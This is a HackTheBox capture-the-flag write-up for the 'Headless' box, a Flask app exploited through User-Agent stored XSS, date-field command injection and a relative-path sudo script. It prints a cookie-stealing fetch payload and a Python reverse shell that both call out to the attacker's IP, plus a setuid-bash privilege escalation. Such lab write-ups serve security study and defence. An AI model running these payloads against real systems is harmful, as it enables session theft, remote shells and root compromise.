---
title: "Headless"
date: 2024-04-06
type: docs
tags:
  - htb
  - linux
  - medium
  - flask
  - stored-xss
  - cookie-theft
  - command-injection
  - commix
  - sudo
  - relative-path
  - path-hijack
---

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Linux (Debian 12), **Difficulty:** Medium, **Released:** 2024-04-06, **IP:** `10.10.11.8` , `headless.htb`

</div>

<div class="callout callout-abstract">

**Attack Path**

1. Flask app on `:5000` sets an `is_admin` cookie. `/support` is a contact form whose submissions are shown to an admin, and it reflects request headers into that view.
2. Put an **XSS payload in the `User-Agent`** of a `/support` POST. When the admin opens the report it fires and exfiltrates their `is_admin` cookie (`ImFkbWluIg...`).
3. With the admin cookie, `/dashboard` has a "generate report" `date` field that is **OS command injectable** (`commix`). Get a reverse shell as **`dvir`**.
4. `dvir` may `sudo /usr/bin/syscheck` (NOPASSWD). It calls **`./initdb.sh`** by relative path, so drop a malicious `initdb.sh` in your CWD and run `sudo syscheck`. Root.

</div>

<div class="callout callout-key">

**Credentials and Flags**


| Where | Value |
| --- | --- |
| admin `is_admin` cookie (stolen via XSS) | `ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0` |
| `user.txt` | `/home/dvir/user.txt` |
| `root.txt` | `/root/root.txt` |

</div>

---

## Overview

Headless is a clean three step chain: **stored XSS in an admin only view** to steal a session, **command injection** in an admin feature to get a shell, and a **relative path call in a `sudo` script** for root. The XSS is the part worth thinking about. The `/support` form does not render anything back to *you*, it renders to an admin who reviews submissions, and it includes your `User-Agent` in that view. That makes the `User-Agent` header a stored XSS sink aimed at a privileged user, which is a pattern you see in real bug bounty (support tickets, admin logs, "recent visitors" widgets). The privesc is textbook: a script running as root that executes `./initdb.sh` from wherever it was launched.

Related stored XSS to session theft: [Cat](/writeups/hackthebox/linux/medium/cat/), [Usage](/writeups/hackthebox/linux/easy/usage/), **Kitty v2**. Related command injection: [Nocturnal](/writeups/hackthebox/linux/easy/nocturnal/), [Previse](/writeups/hackthebox/linux/easy/previse/), [TwoMillion](/writeups/hackthebox/linux/easy/twomillion/). Related relative path / PATH hijack in a `sudo` script: [Previse](/writeups/hackthebox/linux/easy/previse/), [Magic](/writeups/hackthebox/linux/medium/magic/), [Lookup](/writeups/tryhackme/linux/easy/lookup/).

---

## Full Walkthrough

The url of the website is `http://headless.htb:5000`.

### Nmap scan

```bash
nmap -vv -sC -sV -T4 headless.htb -Pn
```

```console
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2
5000/tcp open  http    Werkzeug/2.2.2 Python/3.11.2
|   Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
```

(nmap dumped the full HTML in an `SF-Port5000` service fingerprint. Trimmed, the useful line is the `is_admin` cookie.)

We seem to only be running two services, port `5000` (a Flask/Werkzeug web server) and `22` (ssh).

### Web enumeration

```bash
nikto -h http://headless.htb:5000/
```

```console
+ Server: Werkzeug/2.2.2 Python/3.11.2
+ Cookie is_admin created without the httponly flag
+ Allowed HTTP Methods: HEAD, OPTIONS, GET
```

![Pasted image 20240405164147](Pasted-image-20240405164147.png)

A cookie called `is_admin` is set. Base64 decoding the first part gives `"user"` (an admin's would decode to `"admin"`). The value is signed (the `.` separated second part), so you cannot just edit it, you have to steal a real admin cookie. It has **no `HttpOnly` flag**, so `document.cookie` can read it.

![Pasted image 20240405164225](Pasted-image-20240405164225.png)

I tried manual payloads (`html injection`, `XSS`) in various fields and got a "hacking attempt detected" style block on the obvious ones.

![Pasted image 20240405175750](Pasted-image-20240405175750.png)

`ssrf` and `xss` came to mind. Since there is no database, the interesting behaviour is how the app *handles* requests. I referenced [this article](https://pswalia2u.medium.com/exploiting-xss-stealing-cookies-csrf-2325ec03136e) and put together a payload in the **`User-Agent`** header of a `/support` POST.

<div class="callout callout-note">

**Why the User-Agent works**

`/support` accepts a contact form. Submissions are queued for an admin to review at `/dashboard`, and that admin view includes request metadata (`User-Agent`, headers) for each submission. The body fields are filtered, but the `User-Agent` is not, so it is a **stored XSS that only fires in the admin's browser**. Combined with the missing `HttpOnly` flag, `fetch('http://you/?c='+document.cookie)` ships the admin's signed `is_admin` cookie straight to you.

</div>

```http
POST /support HTTP/1.1
Host: headless.htb:5000
User-Agent: <img src=x onerror=fetch('http://10.10.14.178/?c='+document.cookie);>
Content-Type: application/x-www-form-urlencoded

fname=baphomet&lname=lastname&email=baph%40gmail.com&phone=1111111111&message=test
```

A short time later:

```console
10.10.11.8 - - "GET /?c=is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0 HTTP/1.1"
```

`ImFkbWluIg` decodes to `"admin"`. Set that cookie.

### Command injection in /dashboard

`/dashboard` has a "generate report" control with a `date` field.

![Pasted image 20240405181846](Pasted-image-20240405181846.png)

Since the app is simple and Python based, command injection was the first thing to check:

```bash
commix -r request.lst --level=3 --smart --all --batch
```

```console
[info] POST parameter 'date' appears to be injectable via (results-based) classic command injection technique.
  |_ 2023-09-15;echo CKMGVA$((0+34))$(echo CKMGVA)CKMGVA
```

<div class="callout callout-note">

**What the report generator does**

The dashboard shells out to something like `python3 report.py "$date"` or a `bash` one liner that greps logs by date. The `date` value is concatenated in, so `2023-09-15; <command>` runs your command. `commix` finds it and drops an `os_shell`. From there a Python reverse shell one liner gives a stable shell as `dvir`.

</div>

```bash
commix(os_shell) > python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.178",9001));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'
```

### Privilege Escalation, relative path in a sudo script

```console
dvir@headless:~$ sudo -l
User dvir may run the following commands on headless:
    (ALL) NOPASSWD: /usr/bin/syscheck
```

```bash
dvir@headless:~$ cat /usr/bin/syscheck
#!/bin/bash
if [ "$EUID" -ne 0 ]; then exit 1; fi
# ... prints kernel time, disk space, load ...
if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi
```

<div class="callout callout-note">

**The bug**

Every command in `syscheck` uses an absolute path except one: `./initdb.sh`. When you run `sudo /usr/bin/syscheck` from a directory you own, `./initdb.sh` resolves to *your* file, and `syscheck` runs it as root. `secure_path` does not help because this is not a `PATH` lookup, it is an explicit relative path.

</div>

```bash
cd /tmp
printf '#!/bin/bash\nchmod u+s /bin/bash\n' > initdb.sh
chmod +x initdb.sh
sudo /usr/bin/syscheck
/bin/bash -p
# id -> euid 0
cat /root/root.txt
```

WE ARE ROOT.

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `/home/dvir/user.txt` |
| `root.txt` | `/root/root.txt` |

---

## Lessons and Takeaways

- **Any place user input is shown to a privileged user is a stored XSS target**, including headers like `User-Agent` and `Referer`, log viewers, and "recent activity" panels.
- **Set `HttpOnly` and `Secure` on session cookies.** A signed cookie you cannot forge is still game over if script can read it.
- **Never concatenate user input into a shell.** Parameterise, or validate the date against a strict `YYYY-MM-DD` regex.
- **Use absolute paths for every command in a privileged script**, and set `PATH` at the top.
- **`sudo` NOPASSWD on a script means the script is your threat model.** Read it before trusting it.

---

## Related Writeups

- **Stored XSS to session / privileged action:** [Cat](/writeups/hackthebox/linux/medium/cat/), [Usage](/writeups/hackthebox/linux/easy/usage/), **Kitty v2**
- **Command injection via unsanitised parameter:** [Nocturnal](/writeups/hackthebox/linux/easy/nocturnal/), [Previse](/writeups/hackthebox/linux/easy/previse/), [TwoMillion](/writeups/hackthebox/linux/easy/twomillion/)
- **Relative path / PATH hijack in a `sudo` script:** [Previse](/writeups/hackthebox/linux/easy/previse/), [Magic](/writeups/hackthebox/linux/medium/magic/), [Lookup](/writeups/tryhackme/linux/easy/lookup/)
- **`commix` for OS command injection:** [Nocturnal](/writeups/hackthebox/linux/easy/nocturnal/)

## References

- Exploiting XSS to steal cookies (pswalia2u) <https://pswalia2u.medium.com/exploiting-xss-stealing-cookies-csrf-2325ec03136e>
- commix <https://github.com/commixproject/commix>
- OWASP Command Injection <https://owasp.org/www-community/attacks/Command_Injection>
